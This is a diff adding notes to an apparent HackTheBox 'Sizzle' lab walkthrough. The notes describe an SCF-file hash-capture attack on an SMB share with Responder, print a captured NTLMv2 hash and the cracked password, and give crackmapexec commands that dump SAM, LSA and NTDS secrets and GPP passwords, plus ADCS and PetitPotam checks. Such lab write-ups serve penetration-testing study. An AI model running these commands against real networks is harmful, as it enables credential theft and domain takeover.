@@ -4,6 +4,9 @@ A writable directory in an SMB share allows to steal NTLM hashes which can be cr
 A self signed certificate can be created using the CA and used for PSRemoting. 
 A SPN associated with a user allows a kerberoast attack on the box. 
 The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync
+
+SCF File + Responder LISTENING == Catch the Hash
+NTLMv2 - Hashcat -m 5600
 ####
 
 1-Enumeration:
@@ -166,5 +169,66 @@ The user is found to have Replication rights which can be abused to get Administ
                 Audit                               D        0  Mon Jul  2 15:14:28 2018
                 Banking     
    
+        We Upload everything we can:
+            smb: \> mask ""
+            smb: \> recurse
+            smb: \> prompt
+            smb: \> mget *
+
+        We found that we have access to R/W/X in Users/Publi:
+            smb: \users\> cd Public
+
+        We tryed to inject a remote_shell.exe BUT it was fired by the A.V 
 
 
+        So We will use an SCF file (Shell Command Files):
+            Gathering Hashes
+            SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. 
+            The code below can be placed inside a text file which then needs to be planted into a network share:
+
+            https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
+        
+        We will use Responder to catch the HASH:
+            └─$ sudo responder -I tun0
+        
+
+        We get the Hash:
+            [SMB] NTLMv2-SSP Client   : 10.10.10.103
+            [SMB] NTLMv2-SSP Username : HTB\amanda
+            [SMB] NTLMv2-SSP Hash     : amanda::HTB:cd63abfa6f417c39:88CA8BA505FC8DF6098C0A55E4A2A7E1:010100000000000000AD31D3C470DA01EABB94987F5E536F0000000002000800530054003500330001001E00570049004E002D0030003800420034005A0057005A00440041004E00520004003400570049004E002D0030003800420034005A0057005A00440041004E0052002E0053005400350033002E004C004F00430041004C000300140053005400350033002E004C004F00430041004C000500140053005400350033002E004C004F00430041004C000700080000AD31D3C470DA0106000400020000000800300030000000000000000100000000200000CD1305D419EE098100622E680A2429E9ABF54F3FA901A6F600D7D7B411E9D0100A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0032003800000000000000000000000000                
+
+        We crack the hash:
+            hashcat hash.hash /usr/share/wordlists/rockyou.txt -m 5600
+
+        We continue to enum SMB via crackmapexec:
+            -https://medium.com/r3d-buck3t/crackmapexec-in-action-enumerating-windows-networks-part-2-c61dfb7cd88e
+            └─$ crackmapexec smb 10.10.10.103 -u "amanda" -p 'Ashare1972' --pass-pol
+            └─$ crackmapexec smb 10.10.10.103 -u "amanda" -p 'Ashare1972' --users 
+            └─$ crackmapexec smb 10.10.10.103 -u "amanda" -p 'Ashare1972' --sam 
+            └─$ crackmapexec smb 10.10.10.103 -u "amanda" -p 'Ashare1972' --lsa
+            └─$ crackmapexec smb 10.10.10.103 -u "amanda" -p 'Ashare1972' --ntds <--- FAILED
+            └─$ crackmapexec smb 10.10.10.103 -u "amanda" -p 'Ashare1972' -M gpp_password
+            └─$ crackmapexec smb 10.10.10.103 -u "amanda" -p 'Ashare1972' -M gpp_autologin
+
+
+
+    LDAP 2 Time:
+        We ENUMERATE LDAP ALSO VIA crackmapexec:
+            -https://medium.com/r3d-buck3t/crackmapexec-in-action-enumerating-windows-networks-part-2-c61dfb7cd88e
+
+            The adcs module finds information about the Certificate Enrollment Service and Certificate Templates:
+                └─$ crackmapexec ldap 10.10.10.103 -u "amanda" -p 'Ashare1972' -M adcs                          
+                SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
+                LDAP        10.10.10.103    389    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
+                ADCS                                                Found PKI Enrollment Server: sizzle.HTB.LOCAL
+                ADCS                                                Found CN: HTB-SIZZLE-CA
+                ADCS                                                Found PKI Enrollment WebService: https://sizzle.htb.local/HTB-SIZZLE-CA_CES_UsernamePassword/service.svc/CES
+
+            Then, we add the -o option with the SERVER parameter specifying the CA name “inlanefreight-DC01-CA” to get the available templates
+
+            To check if we can use PETIT POTAM Attack:
+                └─$ crackmapexec ldap 10.10.10.103 -u "amanda" -p 'Ashare1972' -M adcs -o SERVER=sizzle.HTB.LOCAL
+                https://medium.com/r3d-buck3t/domain-takeover-with-petitpotam-exploit-3900f89b38f7
+            
+            IT will not work beacause no NTLM Relay 
